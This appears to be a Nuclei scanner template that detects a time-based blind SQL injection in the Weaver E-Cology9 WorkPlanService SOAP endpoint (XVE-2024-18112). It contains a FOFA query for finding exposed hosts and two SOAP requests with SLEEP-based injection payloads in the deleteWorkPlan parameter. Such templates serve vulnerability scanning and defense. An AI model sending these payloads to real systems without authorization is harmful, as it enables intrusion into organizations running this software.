id: Weaver-E-Cology9-WorkPlanService-sql
info:
  name: 泛微E-Cology9 WorkPlanService SQL注入漏洞(XVE-2024-18112)
  author: Unknown
  severity: high
  description: |-
    fofa: app="泛微-OA（e-cology）"
    该漏洞源于泛微e-cology系统对用户输入的验证机制不足，导致攻击者可通过构造恶意输入将任意SQL代码注入数据库查询中，从而执行未经授权的数据库操作。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/140817331
  tags: 泛微



http:
- raw:
  - |
    POST /services/WorkPlanService HTTP/1.1
    Host: {{Hostname}}
    Content-Type: text/xml;charset=UTF-8

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
      <soapenv:Header/>
        <soapenv:Body>
        <web:deleteWorkPlan>
          <!--type: string-->
          <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(4-(IF(27=27,0,5)))))NZeo)</web:in0>
          <!--type: int-->
          <web:in1>22</web:in1>
        </web:deleteWorkPlan>
        </soapenv:Body>
    </soapenv:Envelope>
  - |
    POST /services/WorkPlanService HTTP/1.1
    Host: {{Hostname}}
    Content-Type: text/xml;charset=UTF-8

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
      <soapenv:Header/>
        <soapenv:Body>
        <web:deleteWorkPlan>
          <!--type: string-->
          <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(8-(IF(27=27,0,5)))))NZeo)</web:in0>
          <!--type: int-->
          <web:in1>22</web:in1>
        </web:deleteWorkPlan>
        </soapenv:Body>
    </soapenv:Envelope>

  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
  - type: status
    status:
    - 200





